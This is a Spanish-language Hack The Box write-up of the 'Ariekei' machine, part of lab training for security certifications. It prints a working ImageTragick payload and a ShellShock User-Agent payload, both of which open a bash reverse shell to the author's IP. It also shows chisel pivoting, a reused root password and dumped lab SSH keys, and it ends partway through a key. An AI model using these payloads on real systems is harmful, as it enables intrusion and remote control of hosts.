---
layout: post
title: Ariekei
date: 2023-03-16
description:
img:
fig-caption:
tags: [eWPT, eWPTXv2, eCPPTv2, OSWE]
---
___

<center><img src="/writeups/assets/img/Ariekei-htb/Ariekei.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Explotación de ImageTragick

* ShellShock Attack

* WAF Bypassing

* Information Disclosure

* Pivoting

* Abuso del grupo Docker (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.65 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-16 12:37 GMT
Nmap scan report for 10.10.10.65
Host is up (0.051s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
1022/tcp open  exp2

Nmap done: 1 IP address (1 host up) scanned in 13.02 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,443,1022 10.10.10.65 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-16 12:42 GMT
Nmap scan report for 10.10.10.65
Host is up (0.080s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a75bae6593cefbddf96a7fde5067f6ec (RSA)
|   256 642ca65e96cafb10058236baf0c992ef (ECDSA)
|_  256 519f8764be99352a80a6a225ebe0959f (ED25519)
443/tcp  open  ssl/http nginx 1.10.2
| tls-nextprotoneg: 
|_  http/1.1
| ssl-cert: Subject: stateOrProvinceName=Texas/countryName=US
| Subject Alternative Name: DNS:calvin.ariekei.htb, DNS:beehive.ariekei.htb
| Not valid before: 2017-09-24T01:37:05
|_Not valid after:  2045-02-08T01:37:05
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Site Maintenance
|_http-server-header: nginx/1.10.2
1022/tcp open  ssh      OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 9833f6b64c18f5806685470cf6b7907e (DSA)
|   2048 78400d1c79a145d428753536ed424f2d (RSA)
|   256 45a67196df62b554666b917b746adbb7 (ECDSA)
|_  256 ad8d4d698e7afdd8cd6ec14f6f81b41f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.36 seconds
```

Añado los subdominios ```calvin.ariekei.htb```, ```eehive.ariekei.htb``` y el dominio ```ariekei.htb``` al ```/etc/hosts```

## Puerto 443 (HTTPS)

Con ```whatweb```, analizo las tecnologías que está empleando el servidor web

```null
whatweb https://10.10.10.65
https://10.10.10.65 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.10.2], IP[10.10.10.65], Title[Site Maintenance], UncommonHeaders[x-ariekei-waf], nginx[1.10.2]
```

La página principal se ve así:

<img src="/writeups/assets/img/Ariekei-htb/1.png" alt="">

Aplico fuzzing para descubrir rutas

```null
gobuster dir -u https://10.10.10.65/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -k -x php --add-slash
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.65/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/03/16 15:25:19 Starting gobuster in directory enumeration mode
===============================================================
/blog/                (Status: 200) [Size: 6454]
/cgi-bin/             (Status: 403) [Size: 287]
/icons/               (Status: 403) [Size: 285]
```

<img src="/writeups/assets/img/Ariekei-htb/2.png" alt="">

Veo una seccion de contacto

<img src="/writeups/assets/img/Ariekei-htb/3.png" alt="">

La intercepto con ```BurpSuite```

```null
POST /blog/mail/contact_me.php HTTP/1.1
Host: 10.10.10.65
Content-Length: 65
Sec-Ch-Ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Origin: https://10.10.10.65
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://10.10.10.65/blog/contact.html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

name=rubbx&phone=1234567890&email=rubbx%40rubbx.com&message=rubbx
```

```null
HTTP/1.1 200 OK
Server: nginx/1.10.2
Date: Thu, 16 Mar 2023 14:55:36 GMT
Content-Length: 1242
Connection: close
Last-Modified: Sat, 16 Sep 2017 00:38:30 GMT
ETag: "192c7-4da-55943ba7d2d80"
X-Ariekei-WAF: beehive.ariekei.htb
Accept-Ranges: bytes

<?php
// Check for empty fields
if(empty($_POST['name'])      ||
   empty($_POST['email'])     ||
   empty($_POST['phone'])     ||
   empty($_POST['message'])   ||
   !filter_var($_POST['email'],FILTER_VALIDATE_EMAIL))
   {
   echo "No arguments Provided!";
   return false;
   }
   
$name = strip_tags(htmlspecialchars($_POST['name']));
$email_address = strip_tags(htmlspecialchars($_POST['email']));
$phone = strip_tags(htmlspecialchars($_POST['phone']));
$message = strip_tags(htmlspecialchars($_POST['message']));
   
// Create the email and send the message
$to = 'yourname@yourdomain.com'; // Add your email address inbetween the '' replacing yourname@yourdomain.com - This is where the form will send a message to.
$email_subject = "Website Contact Form:  $name";
$email_body = "You have received a new message from your website contact form.\n\n"."Here are the details:\n\nName: $name\n\nEmail: $email_address\n\nPhone: $phone\n\nMessage:\n$message";
$headers = "From: noreply@yourdomain.com\n"; // This is the email address the generated message will be from. We recommend using something like noreply@yourdomain.com.
$headers .= "Reply-To: $email_address";   
mail($to,$email_subject,$email_body,$headers);
return true;         
?>
```

Se leakea el código en PHP. Pero lo más destacable es que se puede ver en una cabecera de respuesta un WAF. Le aplico un escaneo

```null
wafw00f beehive.ariekei.htb

                ______
               /      \
              (  W00f! )
               \  ____/
               ,,    __            404 Hack Not Found
           |`-.__   / /                      __     __
           /"  _/  /_/                       \ \   / /
          *===*    /                          \ \_/ /  405 Not Allowed
         /     )__//                           \   /
    /|  /     /---`                        403 Forbidden
    \\/`   \ |                                 / _ \
    `\    /_\\_              502 Bad Gateway  / / \ \  500 Internal Error
      `_____``-`                             /_/   \_\

                        ~ WAFW00F : v2.2.0 ~
        The Web Application Firewall Fingerprinting Toolkit
    
[*] Checking https://beehive.ariekei.htb
[+] Generic Detection results:
[*] The site https://beehive.ariekei.htb seems to be behind a WAF or some sort of security solution
[~] Reason: The server returns a different response code when an attack string is used.
Normal response code is "200", while the response code to cross-site scripting attack is "403"
[~] Number of requests: 5
```

En caso de ser detectadas las etiquetas ```script```, imprime por pantalla un ASCII Art

<img src="/writeups/assets/img/Ariekei-htb/4.png" alt="">

Podría intentar un shellsock attack a través del directorio ```/cgi-bin```

```null
gobuster dir -u https://10.10.10.65/cgi-bin -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -k -x php --add-slash
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.65/cgi-bin
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/03/16 15:26:55 Starting gobuster in directory enumeration mode
===============================================================
/stats/               (Status: 200) [Size: 1264]
```

Tramito una petición por GET a ```/stats```

<img src="/writeups/assets/img/Ariekei-htb/5.png" alt="">

La versión de ```bash``` es vulnerable. En este [artículo](https://blog.cloudflare.com/inside-shellshock/) de Cloudflare está todo detallado. Modifico el User-Agent, pero al intentar ejecutar comandos me salta el WAF

```null
User-Agent: () { :; }; /usr/bin/id
```

De momento no puedo hacer nada, así que paso a enumerar el subdominio ```calvin.ariekei.htb```. No carga nada de primeras

```null
curl -s -X GET https://calvin.ariekei.htb/ -k | html2text
****** Not Found ******
The requested URL was not found on the server. If you entered the URL manually
please check your spelling and try again.
```

Así que fuzzeo rutas

```null
 wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt https://calvin.ariekei.htb/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://calvin.ariekei.htb/FUZZ
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000352:   200        34 L     141 W      1656 Ch     "upload"
```

En ```/upload``` hay un formulario de subida de imagenes

<img src="/writeups/assets/img/Ariekei-htb/6.png" alt="">

Al intentar subir una foto cualqueria, se queda colgado. Existe una vulnerabilidad para ```Image Magisk```, un procesador de imágenes. En este [artículo](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/) explican en que consiste. Creo un archivo ```pwned.mvg``` con el siguiente contenido:

```null
push graphic-context
viewbox 0 0 640 480
fill 'url(https://asdfasdf/0asdf.jpg"|ping -c 1 10.10.16.11;echo "asdf)'
pop graphic-context
```

Y recibo la traza ICMP

```null
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
16:19:39.829690 IP 10.10.10.65 > 10.10.16.11: ICMP echo request, id 15, seq 1, length 64
16:19:39.831320 IP 10.10.16.11 > 10.10.10.65: ICMP echo reply, id 15, seq 1, length 64
```

Me mando una reverse shell y gano acceso a un contenedor

```null
push graphic-context
viewbox 0 0 640 480
fill 'url(https://1.1.1.1/0xdf.jpg"|bash -i >& /dev/tcp/10.10.16.11/443 0>&1;echo "yay)'
pop graphic-context
```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.11] from (UNKNOWN) [10.10.10.65] 55134
[root@calvin app]# script /dev/null -c bash
script /dev/null -c bash
[root@calvin app]# ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                reset xterm
[root@calvin app]# export TERM=xterm
[root@calvin app]# export SHELL=bash
[root@calvin app]# stty rows 55 columns 209
```

```null
[root@calvin tmp]# hostname -I
172.23.0.11
```

Subo un binario estático de ```nmap``` para aplicar HostDiscovery

```null
[root@calvin tmp]# ./nmap --min-rate 5000 -n -sn 172.23.0.1/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-16 16:25 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.23.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000031s latency).
MAC Address: 02:42:69:67:0B:BC (Unknown)
Nmap scan report for 172.23.0.252
Host is up (0.000029s latency).
MAC Address: 02:42:AC:17:00:FC (Unknown)
Nmap scan report for 172.23.0.253
Host is up (0.0000070s latency).
MAC Address: 02:42:AC:17:00:FD (Unknown)
Nmap scan report for 172.23.0.11
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 0.31 seconds
```

Y para todas ellas, los puertos

```null
[root@calvin tmp]# ./nmap -p- --open --min-rate 5000 -n -Pn $(./nmap --min-rate 5000 -n -sn 172.23.0.1/24 | grep -oP '\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}' | grep 172 | xargs)
Cannot find nmap-payloads. UDP payloads are disabled.
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-16 16:27 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.

Nmap scan report for 172.23.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000032s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
1022/tcp open  exp2
MAC Address: 02:42:69:67:0B:BC (Unknown)

Nmap scan report for 172.23.0.252
Host is up (0.000016s latency).
Not shown: 65534 closed ports
PORT    STATE SERVICE
443/tcp open  https
MAC Address: 02:42:AC:17:00:FC (Unknown)

Nmap scan report for 172.23.0.253
Host is up (0.000016s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:42:AC:17:00:FD (Unknown)

Nmap scan report for 172.23.0.11
Host is up (0.000037s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
8080/tcp open  webcache

Nmap done: 4 IP addresses (4 hosts up) scanned in 81.87 seconds
```

El directorio ```app``` es una montura de otro contenedor

```null
Nmap done: 4 IP addresses (4 hosts up) scanned in 81.87 seconds
[root@calvin tmp]# df -h
Filesystem                    Size  Used Avail Use% Mounted on
none                          4.2G  3.1G  1.1G  75% /
tmpfs                        1001M     0 1001M   0% /dev
tmpfs                        1001M     0 1001M   0% /sys/fs/cgroup
/dev/mapper/ariekei--vg-root  4.2G  3.1G  1.1G  75% /app
udev                          981M     0  981M   0% /root/.sh_history
shm                            64M     0   64M   0% /dev/shm
tmpfs                        1001M     0 1001M   0% /sys/firmware
```

En ```/common``` hay un directorio oculto con secretos

```null
[root@calvin common]# pwd
/common
[root@calvin common]# ls -la
total 20
drwxr-xr-x  5 root root 4096 Sep  2  2021 .
drwxr-xr-x 36 root root 4096 Sep  2  2021 ..
drwxrwxr-x  2 root root 4096 Sep  2  2021 .secrets
drwxr-xr-x  6 root root 4096 Sep  2  2021 containers
drwxr-xr-x  2 root root 4096 Sep  2  2021 network
```

Son un par de claves

```null
[root@calvin .secrets]# ls
bastion_key  bastion_key.pub
[root@calvin .secrets]# cat *
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA8M2fLV0chunp+lPHeK/6C/36cdgMPldtrvHSYzZ0j/Y5cvkR
SZPGfmijBUyGCfqK48jMYnqjLcmHVTlA7wmpzJwoZj2yFqsOlM3Vfp5wa1kxP+JH
g0kZ/Io7NdLTz4gQww6akH9tV4oslHw9EZAJd4CZOocO8B31hIpUdSln5WzQJWrv
pXzPWDhS22KxZqSp2Yr6pA7bhD35yFQ7q0tgogwvqEvn5z9pxnCDHnPeYoj6SeDI
T723ZW/lAsVehaDbXoU/XImbpA9MSF2pMAMBpT5RUG80KqhIxIeZbb52iRukMz3y
5welIrPJLtDTQ4ra3gZtgWvbCfDaV4eOiIIYYQIDAQABAoIBAQDOIAUojLKVnfeG
K17tJR3SVBakir54QtiFz0Q7XurKLIeiricpJ1Da9fDN4WI/enKXZ1Pk3Ht//ylU
P00hENGDbwx58EfYdZZmtAcTesZabZ/lwmlarSGMdjsW6KAc3qkSfxa5qApNy947
QFn6BaTE4ZTIb8HOsqZuTQbcv5PK4v/x/Pe1JTucb6fYF9iT3A/pnXnLrN9AIFBK
/GB02ay3XDkTPh4HfgROHbkwwverzC78RzjMe8cG831TwWa+924u+Pug53GUOwet
A+nCVJSxHvgHuNA2b2oMfsuyS0i7NfPKumjO5hhfLex+SQKOzRXzRXX48LP8hDB0
G75JF/W9AoGBAPvGa7H0Wen3Yg8n1yehy6W8Iqek0KHR17EE4Tk4sjuDL0jiEkWl
WlzQp5Cg6YBtQoICugPSPjjRpu3GK6hI/sG9SGzGJVkgS4QIGUN1g3cP0AIFK08c
41xJOikN+oNInsb2RJ3zSHCsQgERHgMdfGZVQNYcKQz0lO+8U0lEEe1zAoGBAPTY
EWZlh+OMxGlLo4Um89cuUUutPbEaDuvcd5R85H9Ihag6DS5N3mhEjZE/XS27y7wS
3Q4ilYh8Twk6m4REMHeYwz4n0QZ8NH9n6TVxReDsgrBj2nMPVOQaji2xn4L7WYaJ
KImQ+AR9ykV2IlZ42LoyaIntX7IsRC2O/LbkJm3bAoGAFvFZ1vmBSAS29tKWlJH1
0MB4F/a43EYW9ZaQP3qfIzUtFeMj7xzGQzbwTgmbvYw3R0mgUcDS0rKoF3q7d7ZP
ILBy7RaRSLHcr8ddJfyLYkoallSKQcdMIJi7qAoSDeyMK209i3cj3sCTsy0wIvCI
6XpTUi92vit7du0eWcrOJ2kCgYAjrLvUTKThHeicYv3/b66FwuTrfuGHRYG5EhWG
WDA+74Ux/ste3M+0J5DtAeuEt2E3FRSKc7WP/nTRpm10dy8MrgB8tPZ62GwZyD0t
oUSKQkvEgbgZnblDxy7CL6hLQG5J8QAsEyhgFyf6uPzF1rPVZXTf6+tOna6NaNEf
oNyMkwKBgQCCCVKHRFC7na/8qMwuHEb6uRfsQV81pna5mLi55PV6RHxnoZ2wOdTA
jFhkdTVmzkkP62Yxd+DZ8RN+jOEs+cigpPjlhjeFJ+iN7mCZoA7UW/NeAR1GbjOe
BJBoz1pQBtLPQSGPaw+x7rHwgRMAj/LMLTI46fMFAWXB2AzaHHDNPg==
-----END RSA PRIVATE KEY-----
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDwzZ8tXRyG6en6U8d4r/oL/fpx2Aw+V22u8dJjNnSP9jly+RFJk8Z+aKMFTIYJ+orjyMxieqMtyYdVOUDvCanMnChmPbIWqw6UzdV+nnBrWTE/4keDSRn8ijs10tPPiBDDDpqQf21XiiyUfD0RkAl3gJk6hw7wHfWEilR1KWflbNAlau+lfM9YOFLbYrFmpKnZivqkDtuEPfnIVDurS2CiDC+oS+fnP2nGcIMec95iiPpJ4MhPvbdlb+UCxV6FoNtehT9ciZukD0xIXakwAwGlPlFQbzQqqEjEh5ltvnaJG6QzPfLnB6Uis8ku0NNDitreBm2Ba9sJ8NpXh46Ighhh root@arieka
```

También vi una contraseña

```null
[root@calvin bastion-live]# pwd
/common/containers/bastion-live
[root@calvin bastion-live]# cat Dockerfile 
FROM rastasheep/ubuntu-sshd
RUN echo "root:Ib3!kTEvYw6*P7s" | chpasswd
RUN mkdir -p /root/.ssh
RUN echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDwzZ8tXRyG6en6U8d4r/oL/fpx2Aw+V22u8dJjNnSP9jly+RFJk8Z+aKMFTIYJ+orjyMxieqMtyYdVOUDvCanMnChmPbIWqw6UzdV+nnBrWTE/4keDSRn8ijs10tPPiBDDDpqQf21XiiyUfD0RkAl3gJk6hw7wHfWEilR1KWflbNAlau+lfM9YOFLbYrFmpKnZivqkDtuEPfnIVDurS2CiDC+oS+fnP2nGcIMec95iiPpJ4MhPvbdlb+UCxV6FoNtehT9ciZukD0xIXakwAwGlPlFQbzQqqEjEh5ltvnaJG6QzPfLnB6Uis8ku0NNDitreBm2Ba9sJ8NpXh46Ighhh root@arieka" > /root/.ssh/authorized_keys
RUN mkdir /common
```

Me transfiero el ```info.png``` que hay en ```network```. Es un esquema de la infraestructura de red

<img src="/writeups/assets/img/Ariekei-htb/7.png" alt="">

El subdominio ```ezra.ariekel.htb``` no lo conocía. Subo el ```chisel``` para poder tener conectividad con todos los equipos del segmento

En mi equipo lo ejecuto como cliente

```null
chisel server -p 1234 --reverse
```

Desde el contenedor me conecto

```null
./chisel client 10.10.16.11:1234 R:socks &>/dev/null & disown
```

Me intento conectar por SSH a un contenedor, pero recibo un error de firma

```null
proxychains ssh root@172.23.0.253 -i id_rsa
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
sign_and_send_pubkey: no mutual signature supported
root@172.23.0.253: Permission denied (publickey).
```

Pero con un parámetro se soluciona

```null
 proxychains ssh root@172.23.0.253 -i id_rsa -o PubkeyAcceptedKeyTypes=ssh-rsa
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Last login: Mon Nov 13 15:20:19 2017 from 10.10.14.2
root@ezra:~# 
```

Este tiene dos interfaces asignadas

```null
root@ezra:~# hostname -I
172.23.0.253 172.24.0.253
```

Vuelvo a subir el ```nmap``` para el HostDiscovery

```null
root@ezra:/tmp# ./nmap --min-rate 5000 -n -sn 172.24.0.1/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-16 17:05 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.24.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000034s latency).
MAC Address: 02:42:BF:EF:41:72 (Unknown)
Nmap scan report for 172.24.0.2
Host is up (0.000010s latency).
MAC Address: 02:42:AC:18:00:02 (Unknown)
Nmap scan report for 172.24.0.252
Host is up (0.000017s latency).
MAC Address: 02:42:AC:18:00:FC (Unknown)
Nmap scan report for 172.24.0.253
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 0.32 seconds
```

Con todos los puertos

```null
root@ezra:/tmp# ./nmap -p- --open --min-rate 5000 -n -Pn $(./nmap --min-rate 5000 -n -sn 172.24.0.1/24 | grep -oP '\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}' | grep 172 | xargs)
Cannot find nmap-payloads. UDP payloads are disabled.
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2023-03-16 17:07 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.24.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000010s latency).
Not shown: 65532 closed ports, 2 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:42:BF:EF:41:72 (Unknown)

Nmap scan report for 172.24.0.2
Host is up (0.000018s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:18:00:02 (Unknown)

Nmap scan report for 172.24.0.252
Host is up (0.000017s latency).
Not shown: 65534 closed ports
PORT    STATE SERVICE
443/tcp open  https
MAC Address: 02:42:AC:18:00:FC (Unknown)

Nmap scan report for 172.24.0.253
Host is up (0.000029s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 4 IP addresses (4 hosts up) scanned in 81.68 seconds
```

Vuelvo a subir el ```chisel``` y creo otro tunel por SOCKS5, pero por otro puerto

```null
root@ezra:/tmp# ./chisel client 10.10.16.11:1234 R:2080:socks &>/dev/null & disown
```

Es importante que el proxychains esté configurado con una ```dinamic_chain``` y añadido el proxy correctamente. Ahora puedo acceder a la página que era vulnerable al shellsock, pero sin pasar por el WAF

```null
proxychains curl -s -X GET 172.24.0.2/cgi-bin/stats/
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
<pre>
Thu Mar 16 17:13:56 UTC 2023
17:13:56 up 58 min, 0 users, load average: 0.00, 0.02, 0.00
GNU bash, version 4.2.37(1)-release (x86_64-pc-linux-gnu) Copyright (C) 2011 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html> This is free software; you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law.
Environment Variables:
<pre>
SERVER_SIGNATURE=<address>Apache/2.2.22 (Debian) Server at 172.24.0.2 Port 80</address>

HTTP_USER_AGENT=curl/7.88.1
SERVER_PORT=80
HTTP_HOST=172.24.0.2
DOCUMENT_ROOT=/home/spanishdancer/content
SCRIPT_FILENAME=/usr/lib/cgi-bin/stats
REQUEST_URI=/cgi-bin/stats/
SCRIPT_NAME=/cgi-bin/stats
PATH_INFO=/
REMOTE_PORT=52066
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PWD=/usr/lib/cgi-bin
SERVER_ADMIN=webmaster@localhost
PATH_TRANSLATED=/home/spanishdancer/content/index.html
HTTP_ACCEPT=*/*
REMOTE_ADDR=172.24.0.1
SHLVL=1
SERVER_NAME=172.24.0.2
SERVER_SOFTWARE=Apache/2.2.22 (Debian)
QUERY_STRING=
SERVER_ADDR=172.24.0.2
GATEWAY_INTERFACE=CGI/1.1
SERVER_PROTOCOL=HTTP/1.1
REQUEST_METHOD=GET
_=/usr/bin/env
</pre>
</pre>
```

Pero recibo un ```Internal Server Error```

```null
proxychains curl -s -X GET 172.24.0.2/cgi-bin/stats/ -H "User-Agent: () { :; }; /usr/bin/id" | html2text
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
****** Internal Server Error ******
The server encountered an internal error or misconfiguration and was unable to
complete your request.
Please contact the server administrator, webmaster@localhost and inform them of
the time the error occurred, and anything you might have done that may have
caused the error.
More information about this error may be available in the server error log.
===============================================================================
     Apache/2.2.22 (Debian) Server at 172.24.0.2 Port 80
```

Con introducir un ```echo``` al principio vale

```null
proxychains curl -s -X GET 172.24.0.2/cgi-bin/stats/ -H "User-Agent: () { :; }; echo; /usr/bin/id" | html2text
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Me envío una reverse shell

```null
proxychains curl -s -X GET 172.24.0.2/cgi-bin/stats/ -H "User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/10.10.16.11/443 0>&1" | html2text
```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.11] from (UNKNOWN) [10.10.10.65] 55658
www-data@beehive:/usr/lib/cgi-bin$ script /dev/null -c bash
script /dev/null -c bash
www-data@beehive:/usr/lib/cgi-bin$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                reset xterm
www-data@beehive:/usr/lib/cgi-bin$ export TERM=xterm
www-data@beehive:/usr/lib/cgi-bin$ export SHELL=bash
www-data@beehive:/usr/lib/cgi-bin$ stty rows 55 columns 209
```

```null
www-data@beehive:/usr/lib/cgi-bin$ hostname -I
172.24.0.2 
```

Un usuario tiene un directorio personal

```null
www-data@beehive:/home$ ls
spanishdancer
```

Se reutiliza la contraseña que vi en el ```DockerFile``` para el usuario ```root```

```null
www-data@beehive:/home$ su root
Password: 
root@beehive:/home#
```

Puedo ver la primera flag

```null
root@beehive:/home/spanishdancer# cat user.txt 
7aa098653173f7e306e1aa30458c01f0
```

# Escalada

Veo otra ```id_rsa```, pero esta vez encriptada

```null
root@beehive:/home/spanishdancer/.ssh# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,C3EBD8120354A75E12588B11180E96D5

2UIvlsa0jCjxKXmQ4vVX6Ez0ak+6r5VuZFFoalVXvbZSLomIya4vYETv1Oq8EPeh
KHjq5wFdlYdOXqyJus7vFtB9nbCUrgH/a3og0/6e8TA46FuP1/sFMV67cdTlXfYI
Y4sGV/PS/uLm6/tcEpmGiVdcUJHpMECZvnx9aSa/kvuO5pNfdFvnQ4RVA8q/w6vN
p3pDI9CzdnkYmH5/+/QYFsvMk4t1HB5AKO5mRrc1x+QZBhtUDNVAaCu2mnZaSUhE
abZo0oMZHG8sETBJeQRnogPyAjwmAVFy5cDTLgag9HlFhb7MLgq0dgN+ytid9YA8
pqTtx8M98RDhVKqcVG3kzRFc/lJBFKa7YabTBaDoWryR0+6x+ywpaBGsUXEoz6hU
UvLWH134w8PGuR/Rja64s0ZojGYsnHIl05PIntvl9hinDNc0Y9QOmKde91NZFpcj
pDlNoISCc3ONnL4c7xgS5D2oOx+3l2MpxB+B9ua/UNJwccDdJUyoJEnRt59dH1g3
cXvb/zTEklwG/ZLed3hWUw/f71D9DZV+cnSlb9EBWHXvSJwqT1ycsvJRZTSRZeOF
Bh9auWqAHk2SZ61kcXOp+W91O2Wlni2MCeYjLuw6rLUHUcEnUq0zD9x6mRNLpzp3
IC8VFmW03ERheVM6Ilnr8HOcOQnPHgYM5iTM79X70kCWoibACDuEHz/nf6tuLGbv
N01CctfSE+JgoNIIdb4SHxTtbOvUtsayQmV8uqzHpCQ3FMfz6uRvl4ZVvNII/x8D
u+hRPtQ1690Eg9sWqu0Uo87/v6c/XJitNYzDUOmaivoIpL0RO6mu9AhXcBnqBu3h
oPSgeji9U7QJD64T8InvB7MchfaJb9W/VTECST3FzAFPhCe66ZRzRKZSgMwftTi5
hm17wPBuLjovOCM8QWp1i32IgcdrnZn2pBpt94v8/KMwdQyAOOVhkozBNS6Xza4P
18yUX3UiUEP9cmtz7bTRP5h5SlDzhprntaKRiFEHV5SS94Eri7Tylw4KBlkF8lSD
WZmJvAQc4FN+mhbaxagCadCf12+VVNrB3+vJKoUHgaRX+R4P8H3OTKwub1e69vnn
QhChPHmH9SrI2TNsP9NPT5geuTe0XPP3Og3TVzenG7DRrx4Age+0TrMShcMeJQ8D
s3kAiqHs5liGqTG96i1HeqkPms9dTC895Ke0jvIFkQgxPSB6y7oKi7VGs15vs1au
